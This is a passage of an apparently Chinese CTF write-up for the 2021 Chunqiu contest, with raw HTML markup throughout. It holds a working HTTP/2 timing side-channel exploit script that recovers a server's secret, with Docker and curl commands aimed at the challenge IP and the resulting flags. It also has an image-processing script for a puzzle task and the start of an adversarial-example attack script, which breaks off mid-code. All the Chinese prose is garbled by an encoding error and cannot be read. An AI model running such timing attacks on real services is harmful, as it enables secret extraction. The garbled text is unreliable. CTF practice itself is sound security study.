keyword">import</span> logging<span class="token keyword">from</span> hyper <span class="token keyword">import</span> HTTP20Connection<span class="token keyword">from</span> h2time <span class="token keyword">import</span> H2Time<span class="token punctuation">,</span> H2Request<span class="token comment"># Number of requests: TIMING_ITERATIONS * NUM_REQUEST_PAIRS * 2 * |SECRET_CHARSET| * |SECRET|</span>TIMING_ITERATIONS <span class="token operator">=</span> <span class="token number">2</span>  <span class="token comment"># 3</span>NUM_REQUEST_PAIRS <span class="token operator">=</span> <span class="token number">20</span>  <span class="token comment"># 20</span>SECRET_CHARSET <span class="token operator">=</span> <span class="token string">'abcdef'</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>digitsCOMPARISON_CHAR <span class="token operator">=</span> <span class="token string">"x"</span>  <span class="token comment"># This must not be in SECRET_CHARSET</span><span class="token comment"># target = os.environ["TARGET"].rstrip("/")</span>target <span class="token operator">=</span> <span class="token string">"http://8.140.110.118:80"</span>logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>logger <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"exploit"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">:</span>    logging<span class="token punctuation">.</span>disable<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        connection <span class="token operator">=</span> HTTP20Connection<span class="token punctuation">(</span>            target<span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">"http://"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">"https://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># , port=80</span>        connection<span class="token punctuation">.</span>request<span class="token punctuation">(</span>            <span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"secret=</span><span class="token interpolation"><span class="token punctuation">{</span>resource<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>            headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"user-agent"</span><span class="token punctuation">:</span> <span class="token string">"curl/7.73.0"</span><span class="token punctuation">,</span> <span class="token string">"content-type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> connection<span class="token punctuation">.</span>get_response<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        logging<span class="token punctuation">.</span>disable<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">time_difference</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    request_a <span class="token operator">=</span> H2Request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string">/"</span></span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"user-agent"</span><span class="token punctuation">:</span> <span class="token string">"curl/7.73.0"</span><span class="token punctuation">,</span> <span class="token string">"content-type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                          data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"secret=</span><span class="token interpolation"><span class="token punctuation">{</span>a<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    request_b <span class="token operator">=</span> H2Request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string">/"</span></span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"user-agent"</span><span class="token punctuation">:</span> <span class="token string">"curl/7.73.0"</span><span class="token punctuation">,</span> <span class="token string">"content-type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                          data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"secret=</span><span class="token interpolation"><span class="token punctuation">{</span>b<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    a_quicker_count <span class="token operator">=</span> <span class="token number">0</span>    b_quicker_count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>TIMING_ITERATIONS<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> H2Time<span class="token punctuation">(</span>            request_a<span class="token punctuation">,</span> request_b<span class="token punctuation">,</span> num_request_pairs<span class="token operator">=</span>NUM_REQUEST_PAIRS        <span class="token punctuation">)</span> <span class="token keyword">as</span> h2t<span class="token punctuation">:</span>            results <span class="token operator">=</span> <span class="token keyword">await</span> h2t<span class="token punctuation">.</span>run_attack<span class="token punctuation">(</span><span class="token punctuation">)</span>            b_quicker_count <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">[</span>result <span class="token keyword">for</span> result <span class="token keyword">in</span> results <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            a_quicker_count <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">[</span>result <span class="token keyword">for</span> result <span class="token keyword">in</span> results <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> H2Time<span class="token punctuation">(</span>            request_b<span class="token punctuation">,</span> request_a<span class="token punctuation">,</span> num_request_pairs<span class="token operator">=</span>NUM_REQUEST_PAIRS        <span class="token punctuation">)</span> <span class="token keyword">as</span> h2t<span class="token punctuation">:</span>            results <span class="token operator">=</span> <span class="token keyword">await</span> h2t<span class="token punctuation">.</span>run_attack<span class="token punctuation">(</span><span class="token punctuation">)</span>            a_quicker_count <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">[</span>result <span class="token keyword">for</span> result <span class="token keyword">in</span> results <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            b_quicker_count <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">[</span>result <span class="token keyword">for</span> result <span class="token keyword">in</span> results <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a_quicker_count<span class="token punctuation">,</span> b_quicker_count<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># secret_length = 1</span>    <span class="token comment"># while get(COMPARISON_CHAR * secret_length) == b"^_^":</span>    <span class="token comment">#     secret_length += 1</span>    secret_length <span class="token operator">=</span> <span class="token number">10</span>    logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Secret Length: </span><span class="token interpolation"><span class="token punctuation">{</span>secret_length<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    secret <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>secret_length<span class="token punctuation">)</span><span class="token punctuation">:</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">spaced_secret_guess</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"*"</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span> <span class="token operator">+</span> guess <span class="token operator">+</span> <span class="token string">"*"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>secret_length <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        tasks <span class="token operator">=</span> <span class="token punctuation">{</span>            char<span class="token punctuation">:</span> asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>                time_difference<span class="token punctuation">(</span>                    spaced_secret_guess<span class="token punctuation">(</span>                        COMPARISON_CHAR<span class="token punctuation">)</span><span class="token punctuation">,</span> spaced_secret_guess<span class="token punctuation">(</span>char<span class="token punctuation">)</span>                <span class="token punctuation">)</span>            <span class="token punctuation">)</span>            <span class="token keyword">for</span> char <span class="token keyword">in</span> SECRET_CHARSET        <span class="token punctuation">}</span>        <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>gather<span class="token punctuation">(</span><span class="token operator">*</span>tasks<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        lowest_char_quicker <span class="token operator">=</span> <span class="token boolean">None</span>        lowest_char_quicker_count <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">"inf"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> char<span class="token punctuation">,</span> task <span class="token keyword">in</span> tasks<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            comparison_quicker_count<span class="token punctuation">,</span> char_quicker_count <span class="token operator">=</span> task<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> char_quicker_count <span class="token operator">&lt;</span> lowest_char_quicker_count<span class="token punctuation">:</span>                lowest_char_quicker <span class="token operator">=</span> char                lowest_char_quicker_count <span class="token operator">=</span> char_quicker_count            logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span>                <span class="token string-interpolation"><span class="token string">f"Tested: </span><span class="token interpolation"><span class="token punctuation">{</span>secret <span class="token operator">+</span> char<span class="token punctuation">}</span></span><span class="token string"> -- </span><span class="token interpolation"><span class="token punctuation">{</span>comparison_quicker_count<span class="token punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">{</span>char_quicker_count<span class="token punctuation">}</span></span><span class="token string">"</span></span>            <span class="token punctuation">)</span>        secret <span class="token operator">+=</span> lowest_char_quicker        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>        logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Secret Progress: </span><span class="token interpolation"><span class="token punctuation">{</span>secret<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Secret Progress took: </span><span class="token interpolation"><span class="token punctuation">{</span>end <span class="token operator">-</span> start<span class="token punctuation">}</span></span><span class="token string">s"</span></span><span class="token punctuation">)</span>        logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    correct <span class="token operator">=</span> get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>secret<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>  <span class="token comment"># == b"CORRECT!"</span>    logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Secret: </span><span class="token interpolation"><span class="token punctuation">{</span>secret<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Correct: </span><span class="token interpolation"><span class="token punctuation">{</span>correct<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>loop <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span>loop<span class="token punctuation">.</span>run_until_complete<span class="token punctuation">(</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>loop<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ç„¶è€Œï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘åœ¨ Win10 ä¸‹è·‘ç»“æœå±…ç„¶æ²¡å•¥åŒºåˆ«ï¼ŒçœŸçš„ä¸¤ä¸ªä¸åŒå­—æ¯çš„è¯·æ±‚å‘å‡ºå»ç»“æœå‡ ä¹å¯¹åŠåˆ†ï¼Œå–µå–µå–µï¼Ÿ</p><p>æœ€åå¹²è„†ç›´æ¥åˆ° Ubuntu ä¸‹æ‹‰ docker é•œåƒæœ¬åœ°å…ˆå¤ç°äº†ä¸€éï¼Œå‘ç°åœ¨ Ubuntu ä¸‹å°±æ²¡é—®é¢˜ï¼Œæ¢ Win10 æ‰“è¿‡å»ä¸è¡Œã€‚</p><p>äºæ˜¯å¹²è„† Docker èµ·ä¸ª exploit æ‰“è¿œç¨‹å¥½äº†ã€‚ï¼ˆè®°å¾—æ”¹ <code>exploit.py</code>ï¼‰</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker build -t spaceless-spacing-exploit -f Dockerfile.exploit <span class="token builtin class-name">.</span>docker run -it --rm --network<span class="token operator">=</span>host -e <span class="token assign-left variable">TARGET</span><span class="token operator">=</span><span class="token string">'http://8.140.110.118:80'</span> spaceless-spacing-exploit</code></pre><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210131162440980.png" alt="exploit"></p><p>å¤šè¯•å‡ æ¬¡ï¼Œæˆ–è€…å†æŠŠ <code>TIMING_ITERATIONS</code>ï¼Œ<code>NUM_REQUEST_PAIRS</code> æ”¹å¤§ä¸€ç‚¹ã€‚</p><pre class="language-none"><code class="language-none">f865c31f7ef160cddbc9fe65c0d8ab311fc0d2c981f3ccd8c9f16522c8c9f165c0d8c9f1d5c3d8cc</code></pre><p>æ¯”è¾ƒä¸€ä¸‹ï¼Œå†è¯•ä¸€è¯•ï¼Œå¾—å‡º <code>f165c3d8c9</code></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> --http2-prior-knowledge http://8.140.110.118/ -v -d <span class="token string">"secret=f165c3d8c9"</span></code></pre><p>å¾—åˆ° flagã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210131162126981.png" alt="flag"></p><p><code>flag{a8a00a86-46cb-4959-8b26-e4c8cf15b375}</code></p><h2 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h2><blockquote><p>æ‹¼å›¾çš„å¥½å¤„ï¼š</p><p>1ã€åŠ¨æ‰‹åˆåŠ¨è„‘ï¼Œå¼€å‘æ™ºåŠ›ï¼Œå¢åŠ å‡ ä½•ç©ºé—´æ„Ÿ</p><p>2ã€ä½ å¯ä»¥åœ¨æ‹¼å¥½åçš„ä½œå“ä¸Šå‘æŒ¥æƒ³è±¡ï¼Œç»˜ä¸Šä¸ä¼—ä¸åŒçš„è‰²å½©ï¼Œè¿™æ ·ï¼Œä½ çš„ä½œå“å°±æˆäº†ç‹¬ä¸€æ— äºŒçš„è‰ºæœ¯å“äº†ã€‚</p><p>3ã€ä¸å®¶äººæˆ–æœ‹å‹ä¸€èµ·æ‹¼è£…ï¼Œå¢åŠ äº†äº¤æµï¼Œå¢è¿›æ„Ÿæƒ…ä¸äº²æƒ…</p><p>è¿™ä¹ˆå¤šçš„ç›Šå¤„ï¼Œæ‰€ä»¥èµ¶ç´§æ¥ç©å§~</p></blockquote><p>raw: 1920x1080</p><p>piece: 160x120 </p><p>12x9</p><p>ä½†æ˜¯ç»™äº†1125å¼ ç¢ç‰‡ï¼Œå¯è§å·¨å¤šå†—ä½™æ•°æ®ï¼Œå‘ç°æ˜¯æ¯ç§»åŠ¨ä¸€ç‚¹æˆªä¸€å¼ è¿™æ ·çš„ï¼Œå¤ªåäº†ã€‚</p><p>é£æ ¼æ˜¯è¿™æ ·çš„ã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204154656418.png" alt="pieces"></p><p>å½“ç„¶åŸå›¾è¿˜ä¸é”™ã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/demo.jpg" alt="demo"></p><p>äºæ˜¯å…ˆæŠŠå¸¦æœ‰å­—ç¬¦çš„å›¾ç‰‡æŒ‘é€‰å‡ºæ¥ï¼Œç„¶åæ‰“å¼€ PPTï¼Œå¼€å§‹æ‹¼å›¾ã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204154050649.png"></p><p>åŠ äº†ä¸€å †å™ªå£°ï¼Œå¤ªåäº†ï¼ï¼ï¼</p><p>å ä¸ŠåŸå›¾çœ‹çœ‹ã€‚</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204154139372.png"></p><p>è°ƒä¸€ä¸‹é¢œè‰²â€¦â€¦</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204154243882.png"></p><p>å¤ªéš¾å—äº†å•Šï¼</p><p>å†è¯•è¯•åè‰²å’ŒäºŒå€¼åŒ–ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> cv2os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span><span class="token string">"/path/to/the/puzzle/"</span><span class="token punctuation">)</span>filename <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">"output/"</span><span class="token punctuation">)</span>  <span class="token comment"># è·å–ç›®å½•ä¸‹æ‰€æœ‰å›¾ç‰‡å</span><span class="token comment"># print(filename)</span><span class="token comment"># os.listdir()  # æ–¹æ³•ç”¨äºè¿”å›æŒ‡å®šçš„æ–‡ä»¶å¤¹åŒ…å«çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„åå­—çš„åˆ—è¡¨ã€‚</span>base_dir <span class="token operator">=</span> <span class="token string">"output/"</span>        <span class="token comment"># input</span>new_dir <span class="token operator">=</span> <span class="token string">"threshold/"</span>      <span class="token comment"># output</span><span class="token keyword">for</span> img <span class="token keyword">in</span> filename<span class="token punctuation">:</span>    name <span class="token operator">=</span> img    <span class="token keyword">print</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span>    img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>base_dir <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">)</span>    height<span class="token punctuation">,</span>width<span class="token punctuation">,</span>temp <span class="token operator">=</span> img<span class="token punctuation">.</span>shape    img2 <span class="token operator">=</span> img<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># åè‰²</span>            img2<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span>img<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token operator">-</span>img<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token operator">-</span>img<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span>new_dir <span class="token operator">+</span> name<span class="token punctuation">,</span> img2<span class="token punctuation">)</span>    <span class="token comment"># Grayimg = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span>    <span class="token comment"># cv2.imwrite(new_dir + name, Grayimg)</span>    <span class="token comment"># äºŒå€¼åŒ–</span>    <span class="token comment"># ret, thresh = cv2.threshold(Grayimg, 60, 255, cv2.THRESH_BINARY)</span>    <span class="token comment"># cv2.imwrite(new_dir + name, thresh)</span></code></pre><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204154619060.png" alt="åè‰²"></p><p>åæ¥åˆå†ç¾¤å‹æç¤ºä¸‹ï¼Œå®ç°äº†ç”¨ Photoshop æ‰¹é‡å¤„ç†ã€‚ï¼ˆå­¦å¤š</p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210130220932846.png" alt="ps"></p><p><img src="/2021/02/03/CTF_2021chunqiu/image-20210204155031507.png" alt="å¤„ç†åå›¾åƒ"></p><p>å½“ç„¶æœ€åè¿˜æ˜¯æ²¡æ‰¾å…¨/æ²¡è¯•å¯¹ï¼Œçœ¼ç›è¦çäº†â€¦â€¦</p><p>æœ€åçš„ flag æ˜¯è¿™ä¸ªâ†“ï¼Œå­—æ¯é•¿å¾—å¤ªä¸‘äº†ï¼Œå›¾ç‰‡å¤ªèŠ±äº†ï¼ŒçœŸè®¤ä¸å‡ºæ¥ã€‚ã€‚</p><p><code>flag{w9w45my6x8kk4e8gp9nqm6j2c154wad49}</code></p><p><small><em>ï¼ˆè¶Šæƒ³è¶Šè§‰å¾—ï¼Œè¿™ç§æ‹¼å›¾é¢˜ç›®çœŸæ²¡å•¥æ„æ€</em></small></p><h2 id="old-driver"><a href="#old-driver" class="headerlink" title="old_driver"></a>old_driver</h2><blockquote><p>éšç€æ·±åº¦å­¦ä¹ æŠ€æœ¯çš„å‘å±•ï¼ŒåŸºäºæ·±åº¦å­¦ä¹ æŠ€æœ¯çš„è‡ªåŠ¨é©¾é©¶å·²ç»æˆä¸ºäº†å½“ä¸‹ä¸€å¤§çƒ­é—¨ã€‚ä½†æ·±åº¦å­¦ä¹ å¾ˆå®¹æ˜“å—åˆ°å¯¹æŠ—æ ·æœ¬çš„æ”»å‡»ï¼Œè¿™ä¹Ÿä¼šä¸ºè‡ªåŠ¨é©¾é©¶å¸¦æ¥å®‰å…¨éšæ‚£ã€‚é™„ä»¶ä¸­ç»™å‡ºäº†ä¸€ä¸ªè·¯æ ‡è¯†åˆ«ç³»ç»Ÿçš„æ¨¡å‹å’Œä¸€äº›è¾“å…¥çš„è·¯æ ‡å›¾ç‰‡ï¼Œåœ¨è¾“å…¥çš„è·¯æ ‡ä¸­è¢«é»‘å®¢æ··å…¥äº†ä¸€äº›å¯¹æŠ—æ ·æœ¬ï¼Œä½ èƒ½å¦å¸®å¿™æ£€æµ‹å‡ºå…¶ä¸­çš„å¯¹æŠ—æ ·æœ¬å‘¢ï¼Ÿ</p><p>Note: æ•°æ®é›†æ–‡ä»¶å¤¹åä¸ºground truth labelï¼Œè€Œä¸æ˜¯æ¨¡å‹è¾“å‡ºã€‚</p><p><a href="https://pan.baidu.com/s/1Ls7LAEV1a-DmcCeAb_2EQg">é™„ä»¶ä¸‹è½½</a> æå–ç ï¼ˆGAMEï¼‰</p></blockquote><p>åˆæ˜¯ AI é¢˜å•Šï¼ˆï¼ˆ</p><p><em>ï¼ˆè¿™é¢˜æ¯”èµ›çš„æ—¶å€™æ²¡æ€ä¹ˆçœ‹ï¼Œæ¥å¤ç°ä¸€ä¸‹</em></p><p>attack.py æºç </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> glob <span class="token keyword">import</span> glob<span class="token keyword">import</span> torch<span class="token keyword">from</span> torch <span class="token keyword">import</span> nn<span class="token punctuation">,</span> optim<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>functional <span class="token keyword">as</span> F<span class="token keyword">import</span> torchattacks <span class="token comment"># https://github.com/Harry24k/adversarial-attacks-pytorch</span><span class="token keyword">from</span> torchvision <span class="token keyword">import</span> transforms<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> random<span class="token keyword">import</span> os<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token punctuation">,</span> sha256<span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>Model<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv1 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv1_bn <span class="token operator">=</span> nn<span class="token punctuation">.</span>BatchNorm2d<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>pool <span class="token operator">=</span> nn<span class="token punctuation">.</span>MaxPool2d<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv2 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv2_bn <span class="token operator">=</span> nn<span class="token punctuation">.</span>BatchNorm2d<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv3 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Conv2d<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv3_bn <span class="token operator">=</span> nn<span class="token punctuation">.</span>BatchNorm2d<span class="token punctuation">(</span><span class="token number">250</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc1 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span><span class="token number">250</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">350</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc1_bn <span class="token operator">=</span> nn<span class="token punctuation">.</span>BatchNorm1d<span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>fc2 <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span><span class="token number">350</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>dropout <span class="token operator">=</span> nn<span class="token punctuation">.</span>Dropout<span class="token punctuation">(</span>p<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>pool<span class="token punctuation">(</span>F<span class="token punctuation">.</span>elu<span class="token punctuation">(</span>self<span class="token punctuation">.</span>conv1<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> 